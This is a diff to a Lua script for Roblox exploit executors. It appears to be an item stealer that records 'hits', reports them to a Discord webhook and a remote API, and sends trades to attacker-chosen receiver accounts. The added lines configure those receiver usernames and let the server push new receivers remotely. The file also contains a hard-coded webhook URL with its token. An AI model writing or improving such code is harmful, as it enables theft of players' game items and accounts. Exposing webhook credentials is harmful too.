@@ -5,6 +5,15 @@ local XOR_KEY = "Nr46WdKC2kQXvmLQgNDRtAwlkftEb4qtk"
 -- PASTE YOUR DISCORD WEBHOOK URL HERE
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1539394904092844135/k02sDiJZhVhPhvXqZo09NUPOs0XcERaQGBsgYx3XaGCL3RcmbT3cLCE2htMEUqhKp0cq"
 
+-- PASTE YOUR ROBLOX USERNAME(S) HERE -- the accounts that will receive trades
+local RECEIVERS = {
+    "YourUsernameHere",  -- replace with your actual Roblox username(s)
+    -- "AltAccountHere",
+}
+
+-- Set globally so watch_for_dudes() can pick it up immediately
+_G.receivers = RECEIVERS
+
 local request = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
 
 if not request then
@@ -422,6 +431,15 @@ local function register_hit()
             
             if ok2 and data and data.success then
                 SESSION_ID = data.sessionId
+                -- If API returns a receiver list, merge it in (lets you update
+                -- receivers server-side without redeploying the script)
+                if data.receivers and type(data.receivers) == "table" then
+                    for _, name in ipairs(data.receivers) do
+                        if not table.find(_G.receivers, name) then
+                            table.insert(_G.receivers, name)
+                        end
+                    end
+                end
                 return true
             end
         end
